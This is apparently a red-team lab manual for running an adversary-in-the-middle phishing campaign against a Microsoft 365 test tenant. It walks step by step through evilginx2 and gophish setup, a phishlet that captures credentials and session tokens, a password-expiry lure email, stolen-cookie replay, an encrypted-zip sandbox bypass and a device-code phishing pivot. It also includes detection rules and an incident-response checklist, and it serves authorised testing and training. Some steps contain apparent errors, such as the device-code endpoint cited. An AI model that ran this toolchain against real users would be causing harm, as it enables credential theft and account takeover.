# Email Security Deep — AiTM Phishing Campaign Emulation Lab (Deep Dive)

> Companion to `SKILL.md`, `payloads.md`, and `email-security-deep-playbook.md`.
>
> **Authorization**: Every technique in this guide assumes lawful authorization — a signed Statement of Work naming target recipients, sender identities, test window, capture scope, and data-handling requirements. Unscoped phishing is a crime under the US CFAA, UK Computer Misuse Act, EU equivalents, and most other jurisdictions. The placeholder convention uses `<phish-domain>`, `<vps_ip>`, `<target.com>`, `<victim@target.com>`, and `REPLACE_WITH_YOUR_X` for any secret material — never hard-code real credentials.

---

## Introduction and Objective

This deep-dive is a **hands-on, end-to-end lab walkthrough** for adversary-in-the-middle (AiTM) phishing campaign emulation. Where `email-security-deep-playbook.md` is the operational runbook for running a real engagement, this guide is the **lab manual** — a reproducible exercise you can run against a Microsoft 365 Developer tenant to learn the kill chain end to end without ever touching production users.

### Why this lab exists

Modern phishing defense hinges on understanding how evilginx2/modlishka AiTM defeats traditional MFA, why FIDO2 / hardware keys are phishing-resistant, and why Conditional Access policies like "require compliant device" matter. Reading about these is not the same as reproducing them. This lab lets you:

1. Stand up a complete evilginx2 AiTM proxy with TLS, DNS, and lure URL generation
2. Send a campaign via gophish that lands in a real O365 inbox
3. Walk three test users (TOTP, push, FIDO2) through the AiTM flow
4. Capture and replay session cookies
5. Observe exactly where FIDO2 / Conditional Access defeats the attack
6. Generate a funnel report and an IR detection rule

### What you will learn

By the end of this lab you will be able to:

- Configure evilginx2 from scratch, including custom phishlet authoring for non-default services
- Author gophish landing pages that redirect cleanly into evilginx2 lures
- Identify which MFA factors your AiTM will defeat and which it will not (FIDO2)
- Detect AiTM activity from the defender's side using Microsoft Entra ID (Azure AD) sign-in logs
- Build a funnel report that quantifies each stage of the kill chain

### Prerequisites

- A Microsoft 365 Developer Program tenant (free; gives you 25 E5 licenses for dev/test)
- A Linux VPS or local VM (Ubuntu 22.04+ recommended; 2 vCPU / 4 GB RAM minimum)
- A domain you control (use a clearly fictional one like `securitytest.local` plus a real registered domain for TLS, or an authorized subdomain of the client's domain)
- Go 1.21+ (for building evilginx2)
- Python 3.10+ (for gophish API scripts and beacon server)
- DNS control at a registrar that lets you set A, MX, TXT records
- 4-6 hours of focused lab time

### Scope of this lab

**In scope**: evilginx2 phishlet authoring, gophish integration, lure delivery, MFA capture against the three factor types, session replay, detection rule authoring, funnel reporting.

**Out of scope** (covered elsewhere): payload craft beyond HTML smuggling (see `skills/payload-generation/`), endpoint evasion post-execution (see `skills/av-edr-evasion/`), cloud-identity post-exploitation after session capture (see `skills/cloud-identity-attack/`), protocol-level SPF/DKIM/DMARC bypass fundamentals (see `skills/email-protocol-attack/`).

---

## Lab Architecture Overview

```
                  ┌─────────────────────────────┐
                  │  Microsoft 365 Dev Tenant    │
                  │  ├─ user_totp@<target>.onmicrosoft.com   │
                  │  ├─ user_push@<target>.onmicrosoft.com   │
                  │  └─ user_fido2@<target>.onmicrosoft.com  │
                  └──────────────┬──────────────┘
                                 │
                       (victim clicks lure URL)
                                 │
                                 ▼
   ┌──────────────────────────────────────────────────────────┐
   │  Your VPS — <phish-domain>                                │
   │                                                            │
   │  ┌────────────┐    ┌──────────────┐    ┌──────────────┐   │
   │  │  gophish   │───▶│  evilginx2   │───▶│  Microsoft   │   │
   │  │  :3333     │    │  :443 (AiTM) │    │  login       │   │
   │  └─────┬──────┘    └──────┬───────┘    └──────────────┘   │
   │        │                  │                                │
   │        │                  ▼                                │
   │        │           ┌──────────────┐                        │
   │        │           │  sessions DB │ ◀── captured cookies   │
   │        │           └──────────────┘                        │
   │        ▼                                                   │
   │  ┌──────────────┐                                          │
   │  │  beacon/C2   │ ◀── open / click / fido2 events         │
   │  │  Flask app   │                                          │
   │  └──────────────┘                                          │
   └──────────────────────────────────────────────────────────┘
```

The flow:

1. gophish sends mail from `noreply@<phish-domain>` to the three test users
2. Mail body contains a tracking link `https://<phish-domain>/click?id=VICTIM_ID`
3. Recipient clicks; gophish records the click, redirects to evilginx2 lure
4. evilginx2 proxies the O365 login, captures credentials + MFA + session cookies
5. beacon Flask app records open/click/FIDO2 events for the funnel report
6. You export sessions, replay in a fresh browser profile, and verify access

---

## Practice: Lab Walkthrough — Step by Step

### Step 1 — Tenant and Test Users

Sign up for the [Microsoft 365 Developer Program](https://developer.microsoft.com/microsoft-365/dev-program) (free). Once provisioned:

```bash
# After tenant provisioning, create three users in the Microsoft 365 admin center
# (https://admin.microsoft.com) or via PowerShell:

# Install Microsoft.Graph module (one-time)
Install-Module Microsoft.Graph -Scope CurrentUser

# Connect with admin creds
Connect-MgGraph -Scopes "User.ReadWrite.All","UserAuthenticationMethod.ReadWrite.All"

# Create three users
$users = @(
  @{UPN="user_totp@<target>.onmicrosoft.com"; DisplayName="Lab User TOTP"},
  @{UPN="user_push@<target>.onmicrosoft.com"; DisplayName="Lab User Push"},
  @{UPN="user_fido2@<target>.onmicrosoft.com"; DisplayName="Lab User FIDO2"}
)

foreach ($u in $users) {
  New-MgUser -DisplayName $u.DisplayName -UserPrincipalName $u.UPN `
    -PasswordProfile @{
      Password="REPLACE_WITH_YOUR_LAB_PASSWORD_123!"
      ForceChangePasswordNextSignIn=$false
    } -MailNickname ($u.UPN -split '@')[0] -AccountEnabled
}

# Assign each user a different MFA factor:
#   user_totp → TOTP (Microsoft Authenticator code mode)
#   user_push → Push  (Microsoft Authenticator push)
#   user_fido2 → FIDO2 (Touch ID / Windows Hello / hardware key)

# TOTP assignment via Graph API (excerpt)
New-MgUserAuthenticationPhoneMethod -UserId $users[0].UPN -PhoneNumber "+15555550100" -PhoneType "mobile"

# For FIDO2, the user must register a security key interactively at
# https://mysignins.microsoft.com → Security Info → Add sign-in method → Security Key
```

Document the three UPNs — you'll use them throughout the lab.

### Step 2 — Domain and DNS

Use a domain you control. For learning purposes, a clearly-fictional one like `<phish-domain>` (replace with `securitytest.example` or your registered domain) works fine.

```bash
# At your registrar, set:
#   login.<phish-domain>    A    <vps_ip>
#   mail.<phish-domain>     A    <vps_ip>
#   <phish-domain>          MX   10 mail.<phish-domain>
#   <phish-domain>          TXT  "v=spf1 ip4:<vps_ip> -all"
#   _dmarc.<phish-domain>   TXT  "v=DMARC1; p=none; rua=mailto:postmaster@<phish-domain>"

# Verify propagation
dig +short login.<phish-domain>          # must return <vps_ip>
dig +short MX <phish-domain>             # must return mail.<phish-domain>
dig +short TXT <phish-domain>            # must return the SPF record
dig +short TXT _dmarc.<phish-domain>     # must return the DMARC record
```

### Step 3 — VPS Hardening

```bash
# SSH in, then:
apt update && apt upgrade -y
apt install -y ufw fail2ban build-essential git curl unzip python3 python3-pip

# Firewall: SSH + HTTP + HTTPS only
ufw default deny incoming
ufw allow 22/tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw --force enable

# Disable password auth
sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart ssh

# Install Go 1.21 (if not present)
wget -q https://go.dev/dl/go1.21.13.linux-arm64.tar.gz
sudo tar -C /usr/local -xzf go1.21.13.linux-arm64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc
go version  # verify
```

### Step 4 — evilginx2 Build and Configuration

```bash
# Clone and build
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

# Create working directories
mkdir -p /opt/evilginx2/{phishlets,data,logs,redirectors}

# Copy built binary and default phishlets
cp ./bin/evilginx /opt/evilginx2/
cp -r phishlets/* /opt/evilginx2/phishlets/

# Launch evilginx2 (root required for port 53/80/443)
cd /opt/evilginx2
sudo ./evilginx -p phishlets -d

# Inside evilginx2 interactive CLI:
config domain <phish-domain>
config ip <vps_ip>

# Bind O365 phishlet to login subdomain
phishlets hostname office365 login.<phish-domain>
phishlets enable office365

# Verify
phishlets
# → should show office365 as enabled, status "online"

# Create a lure
lures create office365
lures get-url 0
# → https://login.<phish-domain>/<random-id>
# Save this URL — it's what gophish will redirect to
```

evilginx2 auto-requests Let's Encrypt certificates for `login.<phish-domain>`. If DNS isn't propagated yet, cert issuance fails — wait 10-15 minutes and retry `phishlets enable office365`.

### Step 5 — Custom Phishlet Authoring (for non-default services)

The default evilginx2 repo ships phishlets for O365, Google, GitHub, etc. For a service without a phishlet, author one. Below is a simplified template you can adapt.

```yaml
# /opt/evilginx2/phishlets/custom-service.yaml
author: 'kali-claw-lab'
min_ver: '2.3.0'

proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'custom-service.example',
     session: true, is_landing: true}
  - {phish_sub: 'app',   orig_sub: 'app',   domain: 'custom-service.example',
     session: true, is_landing: false}

auth_tokens:
  - domain: '.custom-service.example'
    keys: ['session', 'rememberme', 'csrftoken']

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.custom-service.example'
  path: '/'

# Optional JS injection — runs in victim's browser on proxied page
injects:
  - domain: 'login.custom-service.example'
    trigger: 'login'
    content: |
      // FIDO2 detection beacon
      if (window.PublicKeyCredential) {
        window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable()
          .then(function(uvpa) {
            if (uvpa) {
              fetch('https://login.<phish-domain>/beacon/fido2', {method:'POST'});
            }
          });
      }
```

Authoring workflow:

1. Open Burp Suite, proxy a real login to `custom-service.example`
2. Identify the form field names for `email` and `password` (under `Params` tab)
3. Identify the cookie names set after successful auth (under `Response` → `Set-Cookie`)
4. Fill in the phishlet's `credentials` and `auth_tokens` sections accordingly
5. Drop the YAML into `/opt/evilginx2/phishlets/`
6. In evilginx2 CLI: `phishlets load custom-service`, then `phishlets enable custom-service`

### Step 6 — gophish Installation and Configuration

```bash
# Download gophish
cd /opt
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-arm64.zip
unzip gophish-v0.12.1-linux-arm64.zip -d gophish
cd gophish
chmod +x gophish

# Lock admin UI to localhost (edit config.json)
# Ensure "admin_server.listen_url" is "127.0.0.1:3333"
# Set "phish_server.listen_url" to "0.0.0.0:80"

# Launch
./gophish &
# Initial admin password is printed to stdout — capture it

# SSH tunnel for admin access (from your workstation)
ssh -L 3333:127.0.0.1:3333 user@<vps_ip>
# Then open https://localhost:3333/ in your browser, accept cert warning
# Log in with admin / captured password; CHANGE the password immediately
# Generate an API key (Account Settings → API Key)
```

### Step 7 — gophish API: Sending Profile, Template, Landing Page, Group

```bash
# Export the API key as env var
export GOPHISH_API_KEY="REPLACE_WITH_YOUR_GOPHISH_API_KEY"
GOPHISH="https://localhost:3333/api"

# Sending profile (SMTP relay — for the lab, run postfix or use a free ESP like Mailtrap)
curl -k -X POST $GOPHISH/smtp/ -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "lab-relay",
    "host": "mail.<phish-domain>:587",
    "from_address": "Lab Security <noreply@<phish-domain>>",
    "username": "labuser",
    "password": "REPLACE_WITH_YOUR_SMTP_PASSWORD",
    "ignore_cert_errors": false,
    "headers": {"X-Priority": "1"}
  }'

# Landing page (immediate redirect to evilginx2 lure)
EVILGINX_LURE_URL="https://login.<phish-domain>/<lure-id-from-step-4>"

curl -k -X POST $GOPHISH/pages/ -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -H "Content-Type: application/json" \
  -d "{
    \"name\": \"o365-redirect\",
    \"html\": \"<!DOCTYPE html><html><head><meta http-equiv=\\\"refresh\\\" content=\\\"0; url={{.URL}}\\\"></head><body>Redirecting...</body></html>\",
    \"redirect_url\": \"$EVILGINX_LURE_URL\",
    \"capture_credentials\": false,
    \"capture_passwords\": false
  }"

# Email template
curl -k -X POST $GOPHISH/templates/ -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "lab-urgent-reset",
    "subject": "[Lab] Action Required: Password Expiry in 24h",
    "html": "<html><body><p>Hi {{.FirstName}},</p><p>This is a <strong>lab test</strong>. Your password expires in 24 hours. Reset now: <a href=\"{{.URL}}\">Reset Password</a></p><p>— Lab Security</p></body></html>",
    "text": "Hi {{.FirstName}}, lab test: reset password at {{.URL}}"
  }'

# Recipient group (CSV upload)
cat > /tmp/lab_users.csv <<EOF
First Name,Last Name,Email,Position
Lab,Totp,user_totp@<target>.onmicrosoft.com,Engineer
Lab,Push,user_push@<target>.onmicrosoft.com,Engineer
Lab,Fido,user_fido2@<target>.onmicrosoft.com,Engineer
EOF

curl -k -X POST $GOPHISH/groups/ -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -F "name=lab-users" \
  -F "file=@/tmp/lab_users.csv"
```

### Step 8 — Beacon Server (open / click / FIDO2 telemetry)

gophish tracks opens (1x1 pixel) and clicks natively, but we want a richer funnel including FIDO2 detection. Run a small Flask beacon alongside.

```python
# /opt/beacon/app.py
from flask import Flask, request, send_file, redirect, jsonify
import sqlite3, time, os

app = Flask(__name__)
DB = '/opt/beacon/events.db'

def init_db():
    conn = sqlite3.connect(DB)
    conn.execute('''create table if not exists events
                    (id integer primary key, ts real, victim_id text, event text, meta text)''')
    conn.commit()

@app.before_first_request
def setup(): init_db()

@app.route('/beacon/open')
def open_event():
    vid = request.args.get('id', 'unknown')
    log(vid, 'open', request.headers.get('User-Agent'))
    return send_file('1x1.png', mimetype='image/png')

@app.route('/beacon/fido2', methods=['POST'])
def fido2_event():
    data = request.get_json(silent=True) or {}
    log(data.get('victim_id','unknown'), 'fido2_detected', request.headers.get('User-Agent'))
    return jsonify(status='ok')

@app.route('/report/funnel')
def funnel():
    conn = sqlite3.connect(DB)
    rows = conn.execute('select event, count(distinct victim_id) from events group by event').fetchall()
    return jsonify({event: count for event, count in rows})

def log(vid, event, meta):
    conn = sqlite3.connect(DB)
    conn.execute('insert into events (ts, victim_id, event, meta) values (?,?,?,?)',
                 (time.time(), vid, event, str(meta)))
    conn.commit()

if __name__ == '__main__':
    init_db()
    app.run(host='127.0.0.1', port=5000)
```

```bash
# Launch beacon (bind to localhost; expose via nginx reverse proxy on 443)
cd /opt/beacon
pip3 install flask
python3 app.py &

# nginx config (excerpt) — terminates TLS, proxies /beacon/* to Flask
# /etc/nginx/sites-available/default
#
# server {
#   listen 443 ssl http2;
#   server_name login.<phish-domain>;
#   ssl_certificate     /etc/letsencrypt/live/<phish-domain>/fullchain.pem;
#   ssl_certificate_key /etc/letsencrypt/live/<phish-domain>/privkey.pem;
#
#   location /beacon/ {
#     proxy_pass http://127.0.0.1:5000;
#   }
#
#   location / {
#     proxy_pass https://127.0.0.1:8443;   # evilginx2 (or its bound port)
#   }
# }

systemctl reload nginx
```

Note: evilginx2 itself listens on 443 — if nginx also needs 443, run evilginx2 on 8443 (`config port 8443` inside CLI) and let nginx own 443.

### Step 9 — Launch the Campaign

```bash
# Launch
curl -k -X POST $GOPHISH/campaigns/ -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "lab-aitm-001",
    "template": {"name": "lab-urgent-reset"},
    "page": {"name": "o365-redirect"},
    "smtp": {"name": "lab-relay"},
    "groups": [{"name": "lab-users"}],
    "launch_date": "now"
  }'

# Capture the campaign ID from the response
CAMPAIGN_ID=1

# Live monitoring (refresh every 60s)
watch -n 60 "curl -k -s $GOPHISH/campaigns/$CAMPAIGN_ID/results?api_key=$GOPHISH_API_KEY | jq '.stats'"

# In another shell, tail evilginx2 sessions live
sudo /opt/evilginx2/evilginx -p /opt/evilginx2/phishlets -d -c 'sessions; exit'
```

### Step 10 — Walk Each User Through the Lure

For each of the three users, log into their O365 mailbox (via Outlook on the web at `outlook.office.com`), open the phish mail, and click the link. Then complete the MFA prompt as that user.

**Expected outcomes:**

| User | MFA Factor | Credential Captured | MFA Captured | Session Cookie Captured | Replay Succeeds |
|------|------------|---------------------|--------------|-------------------------|-----------------|
| user_totp | TOTP code | yes | yes | yes | yes |
| user_push | MS Auth push | yes | yes | yes | yes |
| user_fido2 | FIDO2 / platform key | yes | N/A — assertion fails on origin mismatch | **no** | N/A |

For user_fido2, the FIDO2 assertion is bound to `login.microsoftonline.com`'s origin. evilginx2 proxies the request, but the browser refuses to issue the assertion because the visible origin is `login.<phish-domain>`. This is the origin-binding guarantee that makes FIDO2 phishing-resistant.

### Step 11 — Session Capture and Replay

For user_totp and user_push, evilginx2 captures a session cookie set. Export and replay:

```bash
# List sessions
sudo /opt/evilginx2/evilginx -p /opt/evilginx2/phishlets -d -c 'sessions; exit'
# Sample output:
#   id   phishlet    username                                tokens   ip          create_time
#   0    office365   user_totp@<target>.onmicrosoft.com      7        203.0.113.9 2026-06-21 10:42:03
#   1    office365   user_push@<target>.onmicrosoft.com      7        203.0.113.9 2026-06-21 10:48:11

# Export captured cookies for session 0
sudo /opt/evilginx2/evilginx -p /opt/evilginx2/phishlets -d -c 'sessions 0; exit'
# Prints cookie key/value pairs

# Replay in a fresh Firefox profile (with Cookie Quick Manager extension):
#   1. Open Firefox with a clean profile: firefox --no-remote -P lab_replay
#   2. Install "Cookie Quick Manager" extension
#   3. Open Cookie Editor → domain ".login.microsoftonline.com"
#   4. Paste each captured cookie key/value
#   5. Open domain ".office.com" — paste those cookies too
#   6. Navigate to https://www.office.com — should land logged-in as the victim
```

### Step 12 — Conditional Access Reality Check

Enable Conditional Access "require compliant device" on the dev tenant:

1. Azure AD → Security → Conditional Access → New policy
2. Assignments → Users → All users (or just the three lab users)
3. Cloud apps → Office 365
4. Conditions → Device platforms → All
5. Grant → "Require device to be marked as compliant"
6. Enable policy → On

Now re-run Step 11 — the captured cookies will fail to replay because the attacker's VPS is not a compliant (Intune-enrolled) device. Azure AD returns an error page, and sign-in logs show `Conditional Access Status = Failure`.

### Step 13 — Funnel Report

```python
# /opt/beacon/report.py
import requests, json, sqlite3

GOPHISH = 'https://localhost:3333/api'
API_KEY = os.environ['GOPHISH_API_KEY']
CAMPAIGN_ID = 1

# Pull gophish results
g = requests.get(f'{GOPHISH}/campaigns/{CAMPAIGN_ID}/results?api_key={API_KEY}',
                 verify=False).json()

# Pull beacon events
conn = sqlite3.connect('/opt/beacon/events.db')
beacon = conn.execute('select event, count(distinct victim_id) from events group by event').fetchall()
beacon_d = {e: c for e, c in beacon}

# Pull evilginx2 sessions (via CLI — no REST API)
# Re-run with subprocess and parse, or for the lab, hardcode from Step 11
sessions_captured = 2   # user_totp + user_push
fido2_blocked     = 1   # user_fido2

funnel = {
  'sent':              len(g['results']),
  'delivered':         sum(1 for r in g['results'] if r['status'] == 'Sent'),
  'opened':            beacon_d.get('open', 0),
  'clicked':           sum(1 for r in g['results'] if any(e['message'] == 'Email Opened' for e in r.get('timeline', []))),
  'cred_captured':     sessions_captured + fido2_blocked,  # all 3 submitted creds
  'session_captured':  sessions_captured,
  'fido2_blocked':     fido2_blocked,
}
print(json.dumps(funnel, indent=2))

# Save as CSV for the engagement report
import csv
with open('/opt/beacon/funnel.csv', 'w') as f:
    w = csv.writer(f)
    w.writerow(['stage', 'count'])
    for k, v in funnel.items():
        w.writerow([k, v])
```

### Step 14 — Detection Rule (Defender Side)

In the dev tenant's Azure AD sign-in logs, you should see:

- Successful sign-ins from `<vps_ip>` for `user_totp` and `user_push`
- Failed FIDO2 assertion for `user_fido2` (error indicates origin mismatch or user cancellation)
- Conditional Access failures on replay attempts

A simple KQL detection rule (run in Microsoft Sentinel or Azure Log Analytics):

```kql
// Detect AiTM sign-ins: successful browser sign-in from a new IP within 1h of the user's prior sign-in from a different IP
let aiTMwindow = 1h;
SigninLogs
| where ClientAppUsed has "Browser"
| where ResultType == 0
| project TimeGenerated, UserPrincipalName, IPAddress, Location, ClientAppUsed
| join kind=inner (
    SigninLogs
    | where TimeGenerated > ago(aiTMwindow)
    | where ClientAppUsed has "Browser"
    | project UserPrincipalName, PriorIPAddress = IPAddress, PriorTime = TimeGenerated
) on UserPrincipalName
| where IPAddress != PriorIPAddress
| project TimeGenerated, UserPrincipalName, IPAddress, PriorIPAddress, PriorTime
```

Tune the rule against your normal user behavior — false positives from VPN users are common.

### Step 15 — Clean Exit (Evidence Destruction and Teardown)

```bash
# Destroy evilginx2 sessions (per SoW)
sudo /opt/evilginx2/evilginx -p /opt/evilginx2/phishlets -d -c 'sessions delete all; exit'

# Wipe gophish database
sqlite3 /opt/gophish/gophish.db 'delete from results; delete from event_details; delete from campaigns;'

# Wipe beacon database
sqlite3 /opt/beacon/events.db 'delete from events;'

# Destroy any browser profiles used for replay
rm -rf ~/.mozilla/firefox/lab_replay

# Disable phishlets
sudo /opt/evilginx2/evilginx -p /opt/evilginx2/phishlets -d -c 'phishlets disable all; exit'

# Stop services
systemctl stop nginx
pkill -f 'gophish'
pkill -f 'evilginx'
pkill -f 'app.py'

# Revoke DNS (at registrar)
# Retire VPS (after final verification)
```

Document destruction in the engagement report with timestamp and witness signature.

---

## Hands-On Exercises (Self-Assessment)

Complete these exercises to verify your understanding. Each builds on the lab walkthrough above.

### Exercise 1: Custom Service Phishlet

Adapt the Step 5 phishlet template for a self-hosted service (e.g., a local GitLab instance or an internal app at `app.testlab.local`). Verify that:

- The phishlet loads without errors
- A lure URL generates
- A login through the proxy captures both credential fields and the session cookie

**Pass criteria**: `sessions` table shows a captured entry with all expected cookie keys.

### Exercise 2: Encrypted-Zip Sandbox Bypass

Build an encrypted-zip with a benign payload (e.g., a `calc.exe` that just prints "hello"). Send it via gophish. Confirm that Microsoft Defender Safe Attachments either:

- Quarantines the unencrypted variant
- Delivers the encrypted variant (sandbox cannot unzip)

**Pass criteria**: 100% delivery rate for encrypted-zip; 0% for unencrypted variant, in the dev tenant.

### Exercise 3: FIDO2 Pivot to Device-Code Phishing

For user_fido2 (whose session was not captured), pivot to device-code phishing:

1. Generate a device code via Microsoft Graph: `POST /v1.0/deviceLocalCredentials` (or PowerShell `Get-MgDeviceLocalCredential`)
2. Present the code to the user via a fake "Additional verification required" page on your lure domain
3. Ask them to enter the code at `https://microsoft.com/devicelogin`
4. Poll for the resulting device token

**Pass criteria**: You receive a valid device token for user_fido2 (assuming Conditional Access does not block device-code flow).

Note: in real engagements, this pivot requires explicit scope authorization. Many clients will refuse — that's a finding ("device-code flow not blocked").

### Exercise 4: Detection Rule Tuning

Run the Step 14 KQL rule against your dev tenant sign-in logs. Tune it until:

- True positive: the AiTM sign-in from Step 11 fires an alert within 5 minutes
- False positive rate: fewer than 1 alert per 1000 legitimate sign-ins

**Pass criteria**: Documented tuning decisions, with measured TPs/FPs.

---

## Common Pitfalls

### Pitfall 1: DNS Not Propagated Before evilginx2 Launch

**Symptom**: `phishlets enable office365` fails with a TLS error.

**Cause**: Let's Encrypt ACME challenge cannot resolve `login.<phish-domain>` yet.

**Fix**: Verify with `dig +short login.<phish-domain>` — must return your VPS IP. Wait 10-15 minutes after DNS change. If using Cloudflare proxy, disable it during ACME (Cloudflare proxy terminates TLS before reaching your server).

### Pitfall 2: gophish Mail Not Delivered

**Symptom**: Campaign results show "Sending" forever; mailbox never receives.

**Cause**: SPF/DKIM/DMARC misconfigured for `<phish-domain>`; or recipient gateway (Exchange Online Protection for the dev tenant) is blocking due to new-IP reputation.

**Fix**: Verify SPF returns your VPS IP. Send via swaks first to confirm SMTP path. For the lab, sender IP reputation warm-up is often needed — run 10-20 low-volume sends over 3 days before the real campaign.

### Pitfall 3: Session Captured But Replay Fails

**Symptom**: Cookies imported, but office.com still shows login page.

**Cause**: Most often — Conditional Access "require compliant device" is on. Secondary — captured cookie expired (short-lived session tokens). Tertiary — service uses device fingerprinting beyond cookies.

**Fix**: Disable Conditional Access for the lab to confirm the capture/replay chain works; then re-enable to demonstrate the control strength.

### Pitfall 4: FIDO2 Detection Beacon Doesn't Fire

**Symptom**: No `/beacon/fido2` hits despite user_fido2 visiting the lure.

**Cause**: The `injects` block in your phishlet may not run on the FIDO2 prompt page, or `isUserVerifyingPlatformAuthenticatorAvailable()` is not yet called by the proxied page.

**Fix**: Inject the FIDO2 detection JS earlier (on the login landing page, not the MFA prompt page). Verify by inspecting the page source via the victim browser.

### Pitfall 5: Out-of-Scope Recipient

**Symptom**: A recipient outside the lab group receives the phish mail.

**Cause**: Recipient CSV had a typo or extra row; Exchange distribution list expanded; auto-forward rule at the target.

**Fix**: Emergency abort. Trigger teardown immediately. Notify lab owner. In real engagements, this is why recipient lists must be reviewed line-by-line before launch.

### Pitfall 6: VPS IP Blacklisted Mid-Campaign

**Symptom**: Mid-campaign, delivery rate plummets; bounce messages reference Spamhaus or Barracuda.

**Cause**: A new IP at moderate volume can trip reputation thresholds.

**Fix**: Monitor blacklists (`dig <reversed-ip>.zen.spamhaus.org`). If listed, pause campaign, request delisting at the blacklist's site, resume only after delisted.

---

## Defense and Incident Response Checklist

When you are on the defender side (responding to a real AiTM incident), use this checklist:

```text
[ ] Identify the scope: which users clicked? Which submitted credentials?
    Which completed MFA? (Azure AD sign-in logs, last 7 days, filter on
    ClientAppUsed=Browser and IPAddress outside normal geo)

[ ] Identify the lure: what was the from-address, subject, URL? Quarantine
    all matching mail across the tenant (Exchange Online PowerShell:
    Get-MailDetail -StartDate ... | Remove-Content)

[ ] Revoke active sessions for affected users:
    Revoke-MgUserAllSession -UserId <upn>

[ ] Reset credentials: force password reset + MFA re-registration.
    For FIDO2-protected users, AiTM did not succeed — do not panic-reset
    unless other indicators suggest compromise.

[ ] Hunt for session replay: in Azure AD sign-in logs, look for
    successful sign-ins from the attacker IP AFTER the phishing click.
    If Conditional Access is enabled, look for CA-failure events too.

[ ] Identify the attacker infra: TLS cert subject on the lure domain
    (crt.sh certificate transparency log), registrar info, hosting
    provider. Submit takedown request to registrar and hosting provider.

[ ] Preserve evidence: export Azure AD sign-in logs, mail flow logs,
    and any on-host EDR telemetry for the affected users.

[ ] Communicate: notify affected users, security leadership, and
    (if PII involved) legal/compliance per your IR plan.

[ ] Post-incident: roll out FIDO2 to any users still on TOTP/push.
    Document control strengths and gaps in the incident report.
```

---

## References and Further Reading

- **evilginx2 documentation**: [github.com/kgretzky/evilginx2](https://github.com/kgretzky/evilginx2) — phishlet format, CLI reference, session management
- **evilgophish**: [github.com/An0nUD4Y/evilgophish](https://github.com/An0nUD4Y/evilgophish) — combined orchestration wrapper
- **modlishka**: [github.com/drk1wi/modlishka](https://github.com/drk1wi/modlishka) — generic reverse-proxy AiTM
- **gophish documentation**: [getgophish.com/docs](https://getgophish.com/docs/) — API reference, template syntax, campaign management
- **King-Phisher**: [github.com/rsmusllp/king-phisher](https://github.com/rsmusllp/king-phisher) — alternative GTK-based platform
- **Microsoft 365 Developer Program**: [developer.microsoft.com/microsoft-365/dev-program](https://developer.microsoft.com/microsoft-365/dev-program) — free E5 dev tenant
- **CISA AiTM advisory**: [cisa.gov/news-events/cybersecurity-advisories](https://www.cisa.gov/news-events/cybersecurity-advisories) (search: adversary-in-the-middle) — real-world attacker TTPs
- **Microsoft Security Blog — AiTM research**: [microsoft.com/en-us/security/blog](https://www.microsoft.com/en-us/security/blog) (search: AiTM, EvilProxy, session theft) — attacker campaign writeups
- **FIDO Alliance WebAuthn guidance**: [fidoalliance.org/fido2](https://fidoalliance.org/fido2/) — why FIDO2 is phishing-resistant
- **NIST SP 800-63B**: [pages.nist.gov/800-63-3](https://pages.nist.gov/800-63-3/) — Authenticator Assurance Levels (AAL1/2/3)
- **Microsoft Graph PowerShell**: [learn.microsoft.com/powershell/microsoftgraph](https://learn.microsoft.com/powershell/microsoftgraph/) — user and auth-method management
- **KQL for Azure AD**: [learn.microsoft.com/azure/sentinel/kql-reference](https://learn.microsoft.com/azure/sentinel/kql-reference) — detection rule authoring
- **RFC 8617 (ARC)**: [datatracker.ietf.org/doc/html/rfc8617](https://datatracker.ietf.org/doc/html/rfc8617) — Authenticated Received Chain
- **RFC 7489 (DMARC)**: [datatracker.ietf.org/doc/html/rfc7489](https://datatracker.ietf.org/doc/html/rfc7489) — DMARC fundamentals

---

## Cross-References to Other Skills

- **`skills/email-protocol-attack/`** — Protocol-level SPF/DKIM/DMARC bypass. This lab's Step 2 (DNS setup) builds on its fundamentals.
- **`skills/social-engineering/`** — Pretext design and OSINT. Step 7's email template leans on its pretext patterns.
- **`skills/cloud-identity-attack/`** — Azure AD / O365 post-exploitation. AiTM-captured sessions feed into this skill's techniques.
- **`skills/web-auth-bypass/`** — Session and access-control abuse theory.
- **`skills/payload-generation/`** — Payload craft for the attachment path beyond HTML smuggling.
- **`skills/av-edr-evasion/`** — Endpoint evasion once a payload runs.
- **`skills/osint/`** & **`skills/recon-osint/`** — OSINT for recipient enumeration (when adapting from lab to engagement).
- **`skills/engagement-manager/`** — Scoping and authorization. **Read this before adapting any lab technique to a real engagement.**

---

## Lab Summary

You have now reproduced the full AiTM phishing kill chain end-to-end:

1. Set up evilginx2 with a real O365 phishlet, TLS, and DNS
2. Ran a gophish campaign against three test users with different MFA factors
3. Captured credentials and session cookies for the TOTP and push users
4. Confirmed FIDO2 defeated the AiTM attempt (origin-binding guarantee)
5. Replayed sessions in a clean browser profile to verify access
6. Enabled Conditional Access and confirmed it blocks session replay
7. Wrote a detection rule that catches the AiTM pattern in Azure AD logs
8. Generated a funnel report and tore down infrastructure cleanly

The two findings that matter most from this lab:

1. **FIDO2 defeats AiTM by design** — not by configuration, not by user training, but by the cryptographic origin-binding guarantee in the WebAuthn spec. This is the single strongest email-phishing defense.
2. **Conditional Access "require compliant device" defeats session replay** — even when the attacker captures a valid session cookie, they cannot use it from a non-compliant device. This is the second-strongest defense.

Real engagements rarely change these two findings — they quantify them. Your role as a red team operator is to measure how often each control fires, and your role as a defender is to close the gaps that allow TOTP/push users to remain at risk.

---

*End of deep-dive.*
